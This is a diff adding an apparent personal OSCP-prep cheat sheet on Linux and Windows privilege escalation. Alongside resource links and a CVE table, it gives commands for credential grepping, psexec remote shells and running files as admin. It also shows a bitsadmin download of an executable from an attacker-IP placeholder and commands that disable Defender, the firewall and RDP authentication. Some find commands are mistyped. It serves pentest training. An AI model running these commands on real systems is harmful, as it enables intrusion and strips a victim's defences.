@@ -1,0 +1,198 @@
+
+Linux Privilege Escalation
+============================
+
+https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/
+
+https://www.youtube.com/watch?v=dk2wsyFiosg
+
+Privilege escalation recon scripts
+====================================
+
+http://www.securitysift.com/download/linuxprivchecker.py
+
+http://pentestmonkey.net/tools/audit/unix-privesc-check
+
+****IMPORTANT*******
+=====================
+“windows/shell_reverse_tcp” and “windows/shell/reverse_tcp”. The first one is unstaged, while the second is staged. 
+You will see the same naming convention with many other payloads too.
+
+What’s the difference between staged and unstaged? 
+If you use an unstaged payload, the entire payload is sent in one hit and executed on the target machine.
+This means that you can catch the shell with a simple netcat listener and it will work fine. 
+If you’re using a staged payload, you need to use a Metasploit multi handler to catch the shell (this is allowed in the exam, by the way!). 
+If you attempt to use a netcat listener to catch the shell, the connection will be received and then die instantly. 
+Staged payloads are a smaller initial payload which then downloads the full payload from the Metasploit handler on your local box. 
+
+
+OSCP LINK:
+
+    Exam requirements (also contains reporting requirements): https://support.offensive-security.com/#!oscp-exam-guide.md
+    
+    PWK support page: https://support.offensive-security.com/#!pwk-support.md
+
+Github Work Link
+=================
+
+https://github.com/maurosoria/dirsearch
+
+https://github.com/Sturmrufer/OSCP-Survival-Guide_
+
+https://github.com/adon90/pentest_compilation
+
+https://github.com/mikaelkall/OSCP-cheat-sheet
+
+https://github.com/cokebottle/oscp-tools
+
+https://github.com/kyawthiha7/oscp_notes
+
+https://github.com/burntmybagel/OSCP-Prep
+
+https://github.com/slyth11907/Cheatsheets
+
+Privilege Escalation ( Without Metasploit )
+====================
+
+https://github.com/SecWiki/windows-kernel-exploits
+
+#Security Bulletin    #KB            #Description                                       #Operating System  
+MS17-017 　           [KB4013081]　　[GDI Palette Objects Local Privilege Escalation]　　(windows 7/8)
+CVE-2017-8464 　      [LNK Remote Code Execution Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
+CVE-2017-0213 　      [Windows COM Elevation of Privilege Vulnerability]　　(windows 10/8.1/7/2016/2010/2008)
+CVE-2018-0833         [SMBv3 Null Pointer Dereference Denial of Service]    (Windows 8.1/Server 2012 R2)
+CVE-2018-8120         [Win32k Elevation of Privilege Vulnerability] (Windows 7 SP1/2008 SP2,2008 R2 SP1)
+MS17-010 　           [KB4013389]　　[Windows Kernel Mode Drivers]　　(windows 7/2008/2003/XP)
+MS16-135 　           [KB3199135]　　[Windows Kernel Mode Drivers]　　(2016)
+MS16-111 　           [KB3186973]　　[kernel api]　　(Windows 10 10586 (32/64)/8.1)
+
+
+Buffer OverFlow
+================
+
+https://sploitfun.wordpress.com/2015/05/08/classic-stack-based-buffer-overflow/
+
+
+exploit most of the machines below tools:
+==========================================
+
+--Nmap, Netcat for port scanning and testing vulnerabilities
+--Dirbuster, Gobuster, Nikto and Burpsuite for Web application scanning
+--Tcpdump, Wireshark for sniffing traffic
+--Python HTTP Servers to serve RFI php shells.
+--Mimikatz, pwdump, fgdump, pwdump and procmon for password dumping and pass the hash/golden ticket attacks
+--Cuda Hashcat for password cracking (Nvidia graphics card)
+--Iptables, proxychains and sshuttle for routing hops
+--Medusa, Hydra for Http login form bruteforcing
+--Grep, sed, awk, sort, uniq, find, findstr, cut for finding passwords and sensitive files during privilege escalation and post exploitation recon
+--Snmpenum, enum4linux, nullinux, smbmap for smb and snmp enumeration
+--Powershell scripts and bitsadmin(built-in windows tool) to download files (highly recommended if you are not using meterpreter shell)
+--Sendemail, Python Servers for social engineering (yes, you will have to perform SE on automated bot systems for client side attacks)
+--Accesscheck.exe from sysinternals and Ntrights.exe, Churrasco.exe to find access misconfigurations
+--Psexec for lateral movements and remote shells
+--Cadaver and davtest for windows asp based web server to test read/write access
+
+reverse shells of perl, python, bash, socat and awk from pentestmonkey for quick tcp reverse shells.
+
+Post Exploit Enumeration
+========================
+
+grep -rnw '/' -ie 'pass' --color=always
+grep -rnw '/' -ie 'password' --color=always
+grep -rnw '/' -ie 'DB_PASS' --color=always
+grep -rnw '/' -ie 'DB_PASSWORD' --color=always
+grep -rnw '/' -ie 'DB_USER' --color=always
+
+File Upload on linux systems via base64 encoding
+=================================================
+
+cat file2upload | base64
+
+--Once the file is converted to base64, 
+--you can just create a new file on the remote system and copy the base64 output of the above file into it. 
+--Next step would be to reverse the base64 to binary
+
+cat fileWithBase64Content | base64 -d > finalBinary
+
+--You can also use the smbserver.py from Impacket’s repo to host a temporary smb server 
+--and fetch files in windows from remote smb servers using the net use command.
+
+PSexec Shells of Remote Systems
+================================
+
+.\psexec64.exe \\192.168.x.x -u .\administrator -p admin@123 cmd.exe
+
+Powershell Sudo for Windows
+===========================
+--There maybe times when you know the creds to admin, but will have a low privileged shell. Unlike Linux, we cannot sudo on windows machines. So, I wrote a simple powershell script for that which can run a separate file as admin. You can run a batch file to add a new superuser or just execute a meterpreter binary as admin. 
+--The below command is to be run in a powershell window:
+
+$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
+$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
+$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
+Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'
+
+--If however you want to run the powershell from a cmd prompt, 
+--you can run store the above command in a xyz.ps1 file and run it in cmd as below:
+
+powershell -ExecutionPolicy Bypass -File xyz.ps1 
+
+---The Set-ExecutionPolicy cmdlet enables you to determine which Windows PowerShell scripts (if any) will be allowed to run on ---your computer. Windows PowerShell has four different execution policies:
+
+---Restricted – No scripts can be run. Windows PowerShell can be used only in interactive mode.
+---AllSigned – Only scripts signed by a trusted publisher can be run.
+---RemoteSigned – Downloaded scripts must be signed by a trusted publisher before they can be run.
+---Unrestricted – No restrictions; all Windows PowerShell scripts can be run.
+
+
+Download files in Windows with bitsadmin
+=========================================
+
+bitsadmin /transfer mydownloadjob /download /priority normal http://<attackerIP>/xyz.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\xyz.exe
+
+Disable firewall/defender and enable RDP for all
+================================================
+
+sc stop WinDefend
+netsh advfirewall show allprofiles
+netsh advfirewall set allprofiles state off
+netsh firewall set opmode disable
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
+
+
+Find files with SUID permission
+================================
+
+find / -perm -4000 -type f 2>/dev/null
+
+Find files with open permissions
+=================================
+
+find / -perm -777 -type f 2>/dev/null
+
+Find files with SUID permission for current user
+==================================================
+
+find / perm /u=s -user `whoami` 2>/dev/null
+find / -user root -perm -4000 -print 2>/dev/null
+
+Find files with writable permission for current user or current group
+=====================================================================
+
+find / perm /u=w -user `whoami` 2>/dev/null
+find / -perm /u+w,g+w -f -user `whoami` 2>/dev/null
+find / -perm /u+w -user `whoami` 2>/dev/nul
+
+Find directories with writable permissions for current user or current group
+=============================================================================
+
+find / perm /u=w -type -d -user `whoami` 2>/dev/null
+find / -perm /u+w,g+w -d -user `whoami` 2>/dev/null
+
+So, I made myself a few commitments:
+
+Try avoiding Metasploit at all costs. Neither exploits nor meterpreter shells. 
+(However I had to use them at few places where I needed to use shellcode or needed to quickly migrate my shell from an unstable exploit/process)
+Only use msfvenom for building shellcode.
+Use netcat for reverse shells.
